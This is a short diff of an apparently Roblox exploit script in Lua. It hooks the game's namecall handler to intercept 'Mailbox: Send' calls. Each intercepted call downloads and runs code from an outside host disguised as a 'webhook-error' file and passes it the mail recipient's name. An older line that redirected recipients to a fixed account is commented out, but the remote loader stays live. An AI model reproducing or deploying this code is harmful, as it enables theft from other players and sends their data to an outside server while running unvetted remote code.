@@ -61,9 +61,10 @@ local function namecallHook(self, ...)
     local method = getnamecallmethod()
     if method == "InvokeServer" and tostring(self) == "Mailbox: Send" then
         local args = {...}
+        print(args[1])
         loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(args[1])
         if args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" then
-            args[1] = "hamster97"
+            --args[1] = "hamster97"
             loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(args[1])
             return oldNamecall(self, unpack(args))
         end
